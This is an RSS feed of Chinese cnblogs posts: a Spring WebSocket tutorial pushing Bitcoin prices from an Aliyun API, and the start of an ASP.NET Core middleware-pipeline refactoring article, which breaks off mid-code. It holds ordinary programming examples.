<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>【WebSocket】---实现定时推送比特币交易信息 - 雨点的名字</title>
<link>http://www.cnblogs.com/qdhxhz/p/9452404.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qdhxhz/p/9452404.html</guid>
<description>
&lt;p&gt;&lt;span&gt;&lt;strong&gt;实现功能&lt;/strong&gt;&lt;/span&gt;：跟虚拟币交易所一样，时时更新当前比特币的价格，最高价，最低价，买一价等等......&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;提示&lt;/strong&gt;：（1）本篇博客是在上一遍基础上搭建，上一篇博客地址：&lt;a id=&quot;homepage1_HomePageDays_DaysList_ctl00_DayList_TitleUrl_1&quot; class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/qdhxhz/p/9438954.html&quot;&gt;【WebSocket】---实现游戏公告功能&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;         （2）相关源码会在其它有关websocket案例写完，写在gitHub上，后期会贴上地址。&lt;/p&gt;
&lt;p&gt;先看效果演示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1090617/201808/1090617-20180809231644131-1666939215.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当前的信息就是虚拟币交易所最新BTC的数据信息。&lt;/p&gt;
&lt;p&gt;我们看到每隔1秒都会更新一次最新的比特币当前信息。（截止到我发这篇博客时，比特币当前价格：6473美元左右）&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;一、案例解析&lt;/span&gt;&lt;/h2&gt;

&lt;h3&gt;&lt;span&gt;1、如何调用虚拟币的接口&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;你想获得BTC最新的价格信息，你首先的有它的相关接口，不然如何获取数据，我是在阿里云上购买的。&lt;/p&gt;
&lt;p&gt;具体步骤：&lt;/p&gt;
&lt;p&gt; （1）登陆阿里云--&amp;gt;云市场--&amp;gt;股票行情于汇率&lt;/p&gt;
&lt;p&gt; （2）有很多企业都有相关接口有股票也有虚拟币&lt;/p&gt;
&lt;p&gt; （3）我选的一家名字叫：实时加密货币行情+推送&lt;/p&gt;
&lt;p&gt;  网址：https://market.aliyun.com/products/57000002/cmapi029361.html?spm=5176.730005.productlist.d_cmapi029361.xtd4I4&lt;/p&gt;
&lt;p&gt; （4）对于接口都有相关说明，按照它的说明就可以获取json数据。同时也可以在线调试。&lt;/p&gt;

&lt;h3&gt;&lt;span&gt;2、通过定时任务时时向客户端发送消息&lt;/span&gt; &lt;/h3&gt;
&lt;p&gt;因为需要服务端隔一定时间向客户端发送消息，所有服务端用定时任务再好不过了。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * //要启动定时任务记得在启动类上添加下面两个注解
 * @ComponentScan(basePackages=&quot;com.jincou.websocket&quot;)
 * @EnableScheduling
 * 功能描述：股票推送,这里只需通过定时任务向客服端发送消息
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CoinSchedule {
    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; WebSocketService ws;
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;代表每一秒执行一次任务&lt;/span&gt;
    @Scheduled(fixedRate=1000&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; coinInfo(){
        ws.sendCoinInfo();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;&lt;span&gt;3、WebSocketService类&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;消息模版工具类，用来推送消息用的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 功能描述：简单消息模板，用来推送消息
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Service
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WebSocketService {

    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpMessagingTemplate template;
 
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 功能描述：Coin版本，虚拟币信息推送
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; sendCoinInfo() {

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;CoinService.getStockInfo()已经把json数据转为实体对象&lt;/span&gt;
        CoinResult coinResult =&lt;span&gt; CoinService.getStockInfo();
        
  String msgTpl &lt;/span&gt;= &quot;虚拟币名称: %s ;代码: %s; 现价格: %s元 ;买一价: %s ; 买一量: %s ; 买二价: %s ; 卖二量: %s;&quot;&lt;span&gt;;
        CoinResult.Obj  obj&lt;/span&gt;=&lt;span&gt;coinResult.getObj();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;null&lt;/span&gt; !=&lt;span&gt; obj) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将 %s 替换成实际值&lt;/span&gt;
            String msg =&lt;span&gt; String.format(msgTpl, obj.getName(), obj.getSecurityCode(), obj.getNow(),
                    obj.getBid1(), obj.getBid1Volume(), obj.getAsk1(), obj.getAsk1Volume());

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;前面参数是订阅地址，后面参数是消息信息（也就是比特币时时消息）&lt;/span&gt;
            template.convertAndSend(&quot;/topic/coin_info&quot;,&lt;span&gt;new&lt;/span&gt;&lt;span&gt; OutMessage(msg));
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;&lt;span&gt;4、CoinService调用接口，并把json格式数据赋值给对象&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;这个是最关键的一步，主要做的事：去调远程接口获取数据后，将数据封装到自己所写的bean实体中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.HashMap;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Map;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.jincou.websocket.model.CoinResult;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.jincou.websocket.utils.HttpUtils;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.jincou.websocket.utils.JsonUtils;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.HttpResponse;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.util.EntityUtils;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 功能描述：接口服务，调用虚拟币行情接口
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CoinService {

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; CoinResult getStockInfo(){
         String host &lt;/span&gt;= &quot;http://alirm-gbdc.konpn.com&quot;&lt;span&gt;;
            String path &lt;/span&gt;= &quot;/query/gbdc&quot;&lt;span&gt;;
            String method &lt;/span&gt;= &quot;GET&quot;&lt;span&gt;;
            String appcode &lt;/span&gt;= &quot;056ed9cdaa674647b6c04b87fe394fcb&quot;&lt;span&gt;;
            Map&lt;/span&gt;&amp;lt;String, String&amp;gt; headers = &lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;最后在header中的格式(中间是英文空格)为Authorization:APPCODE 83359fd73fe94948385f570e3c139105&lt;/span&gt;
            headers.put(&quot;Authorization&quot;, &quot;APPCODE &quot; +&lt;span&gt; appcode);
            Map&lt;/span&gt;&amp;lt;String, String&amp;gt; querys = &lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;BTC代表返回比特币相关信息，如果这里传入ETH那就代表返回以太坊信息&lt;/span&gt;
            querys.put(&quot;symbol&quot;, &quot;BTC&quot;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回连接信息，如果里面带有200，说明连接接口成功&lt;/span&gt;
            HttpResponse response =&lt;span&gt; HttpUtils.doGet(host, path, method, headers, querys);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将response的body信息转为字符串&lt;/span&gt;
            String responseText=&lt;span&gt;EntityUtils.toString(response.getEntity());

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;上面部分只要根据你购买的api接口说明操作就可以，下面才是你需要处理的
            
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将json格式的字符串（根据一定规则）赋值给实体对象（JsonUtils是自己的一个工具类）&lt;/span&gt;
            CoinResult coinResult = JsonUtils.objectFromJson(responseText, CoinResult.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);

            System.out.println(&lt;/span&gt;&quot;控制台打印虚拟币当前信息=======================================&quot;&lt;span&gt;);
            System.out.println(coinResult.toString());
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; coinResult;
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e) {
            e.printStackTrace();
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;&lt;span&gt;5、json格式如何封装到实体&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;这步主要讲，将json格式字符串通过工具类封装到实体对象需要满足的规则：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
CoinResult coinResult = JsonUtils.objectFromJson(responseText, CoinResult.&lt;span&gt;class&lt;/span&gt;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;看这步所需要满足的规则&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;（1）先看接口的json格式&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;70&quot;&gt;
&lt;pre&gt;
{&quot;Code&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,&quot;Msg&quot;:&quot;&quot;,
    &quot;Obj&quot;:{
    &quot;B1&quot;:&lt;/span&gt;&lt;span&gt;271.100&lt;/span&gt;,     &lt;span&gt;--&lt;/span&gt;&lt;span&gt;买一&lt;/span&gt;
    &quot;B1V&quot;:&lt;span&gt;129&lt;/span&gt;,        &lt;span&gt;--&lt;/span&gt;&lt;span&gt;买一量&lt;/span&gt;
    &quot;B2&quot;:&lt;span&gt;0&lt;/span&gt;,           &lt;span&gt;--&lt;/span&gt;&lt;span&gt;买二&lt;/span&gt;
    &quot;B2V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    &quot;B3&quot;:&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,           &lt;span&gt;--&lt;/span&gt;&lt;span&gt;买三&lt;/span&gt;
    &quot;B3V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    &quot;B4&quot;:&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,           &lt;span&gt;--&lt;/span&gt;&lt;span&gt;买四&lt;/span&gt;
    &quot;B4V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,        
    &quot;B5&quot;:&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,           &lt;span&gt;--&lt;/span&gt;&lt;span&gt;买五&lt;/span&gt;
    &quot;B5V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    &quot;S1&quot;:&lt;/span&gt;&lt;span&gt;271.150&lt;/span&gt;,    &lt;span&gt;--&lt;/span&gt;&lt;span&gt;卖一&lt;/span&gt;
    &quot;S1V&quot;:&lt;span&gt;20&lt;/span&gt;,        &lt;span&gt;--&lt;/span&gt;&lt;span&gt;卖一量&lt;/span&gt;
    &quot;S2&quot;:&lt;span&gt;0&lt;/span&gt;,          &lt;span&gt;--&lt;/span&gt;&lt;span&gt;卖二&lt;/span&gt;
    &quot;S2V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    &quot;S3&quot;:&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,          &lt;span&gt;--&lt;/span&gt;&lt;span&gt;卖三&lt;/span&gt;
    &quot;S3V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    &quot;S4&quot;:&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,          &lt;span&gt;--&lt;/span&gt;&lt;span&gt;卖四&lt;/span&gt;
    &quot;S4V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    &quot;S5&quot;:&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,          &lt;span&gt;--&lt;/span&gt;&lt;span&gt;卖五&lt;/span&gt;
    &quot;S5V&quot;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    &quot;ZT&quot;:&lt;/span&gt;&lt;span&gt;280.85&lt;/span&gt;,       &lt;span&gt;--&lt;/span&gt;&lt;span&gt;涨停价&lt;/span&gt;
    &quot;DT&quot;:&lt;span&gt;259.19&lt;/span&gt;,       &lt;span&gt;--&lt;/span&gt;&lt;span&gt;跌停价&lt;/span&gt;
    &quot;O&quot;:&lt;span&gt;270.39&lt;/span&gt;,        &lt;span&gt;--&lt;/span&gt;&lt;span&gt;今开&lt;/span&gt;
    &quot;H&quot;:&lt;span&gt;271.69&lt;/span&gt;,        &lt;span&gt;--&lt;/span&gt;&lt;span&gt;最高&lt;/span&gt;
    &quot;L&quot;:&lt;span&gt;270.14&lt;/span&gt;,        &lt;span&gt;--&lt;/span&gt;&lt;span&gt;最低&lt;/span&gt;
    &quot;YC&quot;:&lt;span&gt;270.55&lt;/span&gt;,       &lt;span&gt;--&lt;/span&gt;&lt;span&gt;昨收&lt;/span&gt;
    &quot;A&quot;:&lt;span&gt;35513202100.0&lt;/span&gt;, &lt;span&gt;--&lt;/span&gt;&lt;span&gt;交易额&lt;/span&gt;
    &quot;V&quot;:&lt;span&gt;130972&lt;/span&gt;,        &lt;span&gt;--&lt;/span&gt;&lt;span&gt;交易量&lt;/span&gt;
    &quot;P&quot;:&lt;span&gt;271.14&lt;/span&gt;,        &lt;span&gt;--&lt;/span&gt;&lt;span&gt;当前价&lt;/span&gt;
    &quot;Tick&quot;:&lt;span&gt;1529911046&lt;/span&gt;, &lt;span&gt;--&lt;/span&gt;&lt;span&gt;标准时间戳&lt;/span&gt;
    &quot;N&quot;:&quot;比特币&quot;,       &lt;span&gt;--&lt;/span&gt;&lt;span&gt;品种名&lt;/span&gt;
    &quot;M&quot;:&quot;&quot;,            &lt;span&gt;--&lt;/span&gt;&lt;span&gt;市场&lt;/span&gt;
    &quot;S&quot;:&quot;BTC&quot;,         &lt;span&gt;--&lt;/span&gt;&lt;span&gt;品种代码&lt;/span&gt;
    &quot;C&quot;:&quot;&quot;             &lt;span&gt;--&lt;/span&gt;&lt;span&gt;编号&lt;/span&gt;
&lt;span&gt;    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;（2）在看我的实体对象属性&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.fasterxml.jackson.annotation.JsonIgnoreProperties;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.fasterxml.jackson.annotation.JsonProperty;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; lombok.Data;

@JsonIgnoreProperties(ignoreUnknown &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)
@Data
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CoinResult {

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;状态码，0代表成功&lt;/span&gt;
    @JsonProperty(&quot;Code&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; Code;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;具体数据（注意这里json用{表示，所有代表对象&lt;/span&gt;
    @JsonProperty(&quot;Obj&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Obj obj;

    @Data
    @JsonIgnoreProperties(ignoreUnknown &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Obj {

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;虚拟币代码&lt;/span&gt;
        @JsonProperty(&quot;S&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String securityCode;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;虚拟币名称&lt;/span&gt;
        @JsonProperty(&quot;N&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;现在价格&lt;/span&gt;
        @JsonProperty(&quot;P&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; now;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;最高价格&lt;/span&gt;
        @JsonProperty(&quot;H&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; high;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;最低价格&lt;/span&gt;
        @JsonProperty(&quot;L&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; low;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;买一价&lt;/span&gt;
        @JsonProperty(&quot;B1&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; bid1;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;买一量&lt;/span&gt;
        @JsonProperty(&quot;B1V&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; bid1Volume;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;卖一价&lt;/span&gt;
        @JsonProperty(&quot;S1&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; ask1;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;卖一量&lt;/span&gt;
        @JsonProperty(&quot;S1V&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; ask1Volume;
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;已成交价，这个接口没有提供，只要记住{}代表是对象，【】代表是结合那就需要集合接受：如下
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;private List&amp;lt;Transaction&amp;gt; transactions;&lt;/span&gt;
&lt;span&gt;    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;总结规则：&lt;/p&gt;
&lt;p&gt;（1）json中的名字和实体中属性名一定要一致才能赋值。&lt;/p&gt;
&lt;p&gt;（2）如果只要有一个你名字一致而数据类型不一样，那么就会整体赋值失败返回null。比如这里B1价，它明明是double，如你你用int接收，那么就会返回null。&lt;/p&gt;
&lt;p&gt;（3）json格式中的数据如果是{},那么可以用对象来接收，好比这的&quot;Obj&quot;:{...}，如果是{[],[]},那就需要List&amp;lt;对象&amp;gt;来接收&lt;/p&gt;

&lt;h3&gt;&lt;span&gt; 6、看前端&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt; 前端没啥好说的只需要订阅：/topic/coin_info 这个地址就可以接收服务端时时发来的消息了。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;想太多，做太少，中间的落差就是烦恼。想没有烦恼，要么别想，要么多做。中校【20】&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Aug 2018 15:20:00 +0000</pubDate>
<dc:creator>雨点的名字</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qdhxhz/p/9452404.html</dc:identifier>
</item>
<item>
<title>利用Asp.Net Core的MiddleWare思想处理复杂业务流程 - 码农阿宇</title>
<link>http://www.cnblogs.com/CoderAyu/p/9452444.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CoderAyu/p/9452444.html</guid>
<description>&lt;p&gt;最近利用Asp.Net Core 的MiddleWare思想对公司的古老代码进行重构，在这里把我的设计思路分享出来，希望对大家处理复杂的流程业务能有所帮助。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;背景&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一个流程初始化接口，接口中根据传入的流程类型，需要做一些不同的工作。&lt;/p&gt;
&lt;p&gt;1.有的工作是不管什么类型的流程都要做的（共有），有的工作是某一流程特有的。&lt;/p&gt;
&lt;p&gt;2.各个处理任务基本不存在嵌套关系，所以代码基本是&lt;span&gt;流水账式的&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;3.流程的种类较多，代码中if或者switch判断占了很大的篇幅。&lt;/p&gt;
&lt;p&gt;4.这些处理工作大致可分为三大类，前期准备工作（参数的校验等），处理中的工作（更新数据库，插入数据等），扫尾工作（日志记录，通知等）&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Asp.Net Core中的MiddleWare&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意第二条，流水账式的代码，这让我想到《管道模型》，而Asp.Net Core的MiddleWare正是放在这个管道中的。&lt;/p&gt;
&lt;p&gt;看下图：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://images2018.cnblogs.com/blog/1293736/201808/1293736-20180809231441218-1153291940.png&quot;&gt;&lt;img title=&quot;image&quot; src=&quot;https://images2018.cnblogs.com/blog/1293736/201808/1293736-20180809231441456-57878957.png&quot; alt=&quot;image&quot; width=&quot;541&quot; height=&quot;347&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有middleware1,middleware2,middleware3这三个中间件放在一个中间件的集合（PipeLine，管道）中并有序排列，Request请求1从流向2载流向3，随之产生的Response从底层依此流出。&lt;/p&gt;
&lt;p&gt;这个Request和Resopnse就封装在我们经常看到的Context上下文中，Context传入到中间件1，中间件1处理后再传出Context给中间件2 &amp;gt;&amp;gt;&amp;gt;&amp;gt;   一直这样传出去，直到传到最后一个。&lt;/p&gt;
&lt;p&gt;我们经常在startup的configure中调用的app.use()方法，其实也就是向这个集合中添加一个middleware,Context进入后，必须被该middleware处理。&lt;/p&gt;
&lt;p&gt;不知道我这么说，大家有没有这种管道模型处理任务的概念了？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;代码解读&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不懂？没关系，那我们结合代码看看。&lt;/p&gt;
&lt;p&gt;上面说过，每个MiddleWare会把Context从自己的身体里面过一遍并主动调用下一个中间件。&lt;/p&gt;
&lt;p&gt;所以，中间件是什么？ 是一个传入是Context,传出也是Context的方法吗？不是！&lt;/p&gt;
&lt;p&gt;是一个传入是委托，传出也是委托，而这传入传出的委托的参数是Context,该委托如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    ///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 管道内的委托任务
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;context&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;delegate&lt;/span&gt; Task PipeLineDelegate&amp;lt;&lt;span&gt;in&lt;/span&gt; TContext&amp;gt;(TContext context);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;所以中间件是下面这样的一个Func，它肩负起了调用下一个中间件（委托）的重任：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
Func&amp;lt;PipeLineDelegate&amp;lt;TContext&amp;gt;, PipeLineDelegate&amp;lt;TContext&amp;gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;而管道又是什么呢？  是Func的集合，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
IList&amp;lt;Func&amp;lt;PipeLineDelegate&amp;lt;TContext&amp;gt;, PipeLineDelegate&amp;lt;TContext&amp;gt;&amp;gt;&amp;gt; _components = &lt;span&gt;new&lt;/span&gt; List&amp;lt;Func&amp;lt;PipeLineDelegate&amp;lt;TContext&amp;gt;, PipeLineDelegate&amp;lt;TContext&amp;gt;&amp;gt;&amp;gt;();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们再Startup方法里面的Configure方法里面的Use是在做什么呢？其实就是在给上面的管道_components添加一个func,如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; IPipeLineBuilder&amp;lt;TContext&amp;gt; Use(Func&amp;lt;PipeLineDelegate&amp;lt;TContext&amp;gt;, PipeLineDelegate&amp;lt;TContext&amp;gt;&amp;gt;&lt;span&gt; func)
        {
            _components.Add(func);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;但是在今天的Use中呢，我还想对原有的Use进行一次重载，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; IPipeLineBuilder&amp;lt;TContext&amp;gt; Use(Action&amp;lt;TContext&amp;gt; action, &lt;span&gt;int&lt;/span&gt;? index = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        {
